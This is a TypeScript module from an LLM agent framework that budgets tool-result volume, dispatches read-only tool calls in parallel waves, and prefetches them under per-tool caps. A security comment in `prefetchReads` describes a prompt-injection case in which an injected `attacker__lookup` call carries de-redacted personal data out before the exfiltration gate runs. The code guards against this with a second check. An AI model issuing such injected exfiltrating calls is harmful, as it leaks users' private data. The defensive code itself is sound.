import type { ChatMessage, ToolCall } from "@openmasq/llm";
import { analyzeArgExfil } from "../state/browserPolicy";
import { isConfidentReadOnly, maxSameToolCalls } from "./mcpAgentClassify";

/**
 * **What bounds a batch of READS, and why it isn't their count.**
 *
 * Going through a mailbox is a search then N reads, and N is whatever the
 * mailbox holds. Per-tool caps (`maxSameToolCalls`) count CALLS, which is
 * a bad proxy: twenty headers fit in the model's window, twenty attachments
 * don't. Raising the read cap without measuring VOLUME would trade a turn
 * cut off mid-way for a « context length exceeded » — which costs the WHOLE turn
 * instead of just its tail.
 *
 * The three pieces hold together and so live in one place (rule 10): the
 * budget, the measurement, and the wave dispatch that makes the measurement work.
 */

/** ≈4 characters per token, and at most HALF the window for results: the
 *  rest carries the system prompt, the tool schemas (the bulk of the turn) and the reply. */
export function resultCharBudget(contextTokens: number | undefined): number {
  return Math.round((contextTokens ?? 128_000) * 4 * 0.5);
}

/** What tool results ALREADY occupy. Re-read from the history rather than kept
 *  in a counter: about fifteen places push a result, and a counter always
 *  forgets one. */
export function toolResultChars(messages: readonly ChatMessage[]): number {
  let n = 0;
  for (const m of messages) if (m.role === "tool") n += m.content.length;
  return n;
}

/** Approximate size of a RAW tool result — the budget's measurement.
 *  ⚠️ NOT `safeJson`, which truncates to 400 characters for the journal: measuring with it
 *  makes the budget blind (every result weighs 400) and therefore inoperative. */
export function approxResultChars(v: unknown): number {
  try {
    return JSON.stringify(v ?? {}).length;
  } catch {
    return 0;
  }
}

/** Reads launched together before re-measuring the volume. */
const PREFETCH_WAVE = 10;

/**
 * Launches reads IN WAVES — and that's what makes the budget work. The whole
 * batch launched in one block decides on nothing: nothing has come back yet when it's
 * time to judge the volume, so a turn can commit twenty huge reads then die at 400. A
 * wave bounds what's already committed without serializing anything INSIDE it: twenty
 * reads stay two parallel waves and ONE single chat round-trip.
 *
 * `dispatch` must RECORD the promise where the loop will await it next — calls
 * from a wave that launched are consumed normally; only those from waves that did NOT
 * launch will fall onto the budget refusal on the loop side.
 */
export async function dispatchInWaves<C, R>(opts: {
  calls: readonly C[];
  dispatch: (call: C) => Promise<R>;
  budget: number;
  /** Volume already present in the history, re-read on every wave. */
  used: () => number;
  wave?: number;
}): Promise<void> {
  const size = opts.wave ?? PREFETCH_WAVE;
  let engaged = 0; // revenu du prefetch, pas encore dans l'historique
  for (let i = 0; i < opts.calls.length; i += size) {
    if (opts.used() + engaged >= opts.budget) return;
    const settled = await Promise.allSettled(opts.calls.slice(i, i + size).map(opts.dispatch));
    for (const r of settled) if (r.status === "fulfilled") engaged += approxResultChars(r.value);
  }
}

/** The result returned when the turn's CUMULATIVE results have eaten the share of the window
 *  that's theirs — the call is NOT dispatched, and the model is told to conclude
 *  with what it has rather than see its turn abort. */
export function contextBudgetNote(tool: string): string {
  return (
    `Volume de résultats maximal atteint pour ce tour : l'appel à \`${tool}\` n'a PAS été exécuté ` +
    `(la suite ne tiendrait plus dans ta fenêtre de contexte). N'appelle PLUS d'outil — réponds ` +
    `MAINTENANT avec ce que tu as déjà lu, en signalant ce qui n'a pas pu être consulté.`
  );
}

/**
 * **Which reads from ONE turn go out in parallel, and how far.**
 *
 * The calls of a single turn are INDEPENDENT by construction — the model emitted
 * them before seeing any result, so one read cannot depend on another's
 * output (a genuine read→read dependency always straddles two
 * turns). Parallelizing the network is therefore safe: redacting the results stays
 * serialized by the vault's mutex, and per-result processing stays sequential in
 * the loop, which only AWAITS the promise already launched.
 *
 * Only reads we're CONFIDENT about go out (`isConfidentReadOnly`): a
 * write, a meta-tool, a tool of unknown intent (a mutation misclassified as
 * `execute_sql`) and a call with malformed arguments go through live and in order
 * via the loop, so that no side effect precedes the write gate.
 */
export async function prefetchReads(o: {
  calls: readonly ToolCall[];
  /** Calls ALREADY executed this turn, per tool — the cap is projected onto this. */
  callCounts: ReadonlyMap<string, number>;
  toolInfo: ReadonlyMap<string, { annotations?: { readOnlyHint?: boolean; destructiveHint?: boolean } }>;
  /** The vault's terms, for the argument-exfiltration scan. */
  vaultTerms: string[];
  /** De-redaction of the arguments, as the real server will receive them. */
  deredact: (args: Record<string, unknown>) => Record<string, unknown>;
  /** Launches the call AND records its promise where the loop will await it. */
  dispatch: (call: ToolCall) => Promise<unknown>;
  budget: number;
  used: () => number;
}): Promise<void> {
  const seen = new Set<string>();
  const projected = new Map<string, number>();
  const eligible: ToolCall[] = [];
  for (const call of o.calls) {
    if (call.argsError) continue;
    // Intra-turn dedup, on the prefetch side: an identical twin must NOT be DISPATCHED
    // here either (the sequential loop's dedup runs after the shot).
    const dupKey = `${call.name}::${JSON.stringify(call.arguments ?? {})}`;
    if (seen.has(dupKey)) continue;
    seen.add(dupKey);
    // Beyond the per-tool cap the sequential loop REFUSES without dispatching — the
    // prefetch must therefore not have already sent it to the server.
    const n = (projected.get(call.name) ?? 0) + 1;
    projected.set(call.name, n);
    const readOnly = isConfidentReadOnly(call.name, o.toolInfo.get(call.name));
    if (!readOnly) continue;
    if ((o.callCounts.get(call.name) ?? 0) + n > maxSameToolCalls(call.name, readOnly)) continue;
    // H-4 (second pass): the write-gate / arg-exfil gate runs in the
    // sequential loop, but a preloaded call goes out HERE — args de-redacted,
    // real server reached, BEFORE that gate. An injected
    // `attacker__lookup(note="…real PII…")` would therefore leak before `analyzeArgExfil`
    // ever sees it. We redo the SAME check now; if it's suspicious, no prefetch — the
    // call falls back to the guarded sequential path, where the confirmation shows the real values.
    if (analyzeArgExfil(o.deredact((call.arguments ?? {}) as Record<string, unknown>), o.vaultTerms).suspicious)
      continue;
    eligible.push(call);
  }
  await dispatchInWaves({
    calls: eligible,
    dispatch: o.dispatch,
    budget: o.budget,
    used: o.used,
  });
}
